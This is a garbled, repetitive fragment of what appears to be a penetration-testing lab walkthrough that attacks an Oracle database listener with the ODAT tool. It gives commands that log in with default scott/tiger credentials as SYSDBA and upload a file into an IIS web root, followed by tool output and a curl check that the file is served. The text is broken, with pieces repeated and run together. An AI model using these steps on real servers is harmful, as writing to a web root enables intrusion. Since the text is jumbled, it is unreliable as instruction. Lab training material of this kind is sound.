  Code/Tools: [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server, . Therefore, we will use a , echo "Oracle File Upload Test" > testing.txt, 

Finally, we can test if the file upload approach worked with , ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt, shell
curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
,  request, or we can visit via browser.

, shell
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
, [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file, curl -X GET http://10.129.204.235/testing.txt

